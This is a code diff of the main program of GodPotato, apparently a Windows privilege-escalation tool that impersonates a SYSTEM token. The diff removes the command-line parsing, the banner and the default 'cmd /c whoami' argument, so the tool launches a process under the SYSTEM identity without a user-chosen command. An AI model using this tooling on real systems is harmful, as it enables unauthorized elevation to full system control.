@@ -10,62 +10,9 @@ namespace GodPotato
     internal class Program
     {
 
-
-        class GodPotatoArgs
-        {
-            [ArgsAttribute("cmd","cmd /c whoami",Description = "CommandLine",Required = true)]
-            public string cmd { get; set; }
-        }
-
-
-
         static void Main(string[] args)
         {
             TextWriter ConsoleWriter = Console.Out;
-
-            GodPotatoArgs potatoArgs;
-
-            string helpMessage = PrintHelp(typeof(GodPotatoArgs), @"                                                                                               
-    FFFFF                   FFF  FFFFFFF                                                       
-   FFFFFFF                  FFF  FFFFFFFF                                                      
-  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF                
-  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
-  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
- FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF   
- FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF  
- FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF  
- FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF 
- FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF 
-  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF 
-  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF  
-   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF   
-    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF    
-"
-, "GodPotato", new string[0]);
-
-
-            if (args.Length == 0)
-            {
-                ConsoleWriter.WriteLine(helpMessage);
-                return;
-            }
-            else
-            {
-                try
-                {
-                    potatoArgs = ParseArgs<GodPotatoArgs>(args);
-                }
-                catch (Exception e)
-                {
-                    if (e.InnerException != null)
-                    {
-                        e = e.InnerException;
-                    }
-                    ConsoleWriter.WriteLine("Exception:" + e.Message);
-                    ConsoleWriter.WriteLine(helpMessage);
-                    return;
-                }
-            }
 
             try
             {
@@ -99,8 +46,7 @@ namespace GodPotato
                 if (systemIdentity != null)
                 {
                     ConsoleWriter.WriteLine("[*] CurrentUser: " + systemIdentity.Name);
-                    TokenuUils.createProcessReadOut(ConsoleWriter, systemIdentity.Token, potatoArgs.cmd);
-
+                    TokenuUils.createProcessReadOut(ConsoleWriter, systemIdentity.Token);
                 }
                 else
                 {
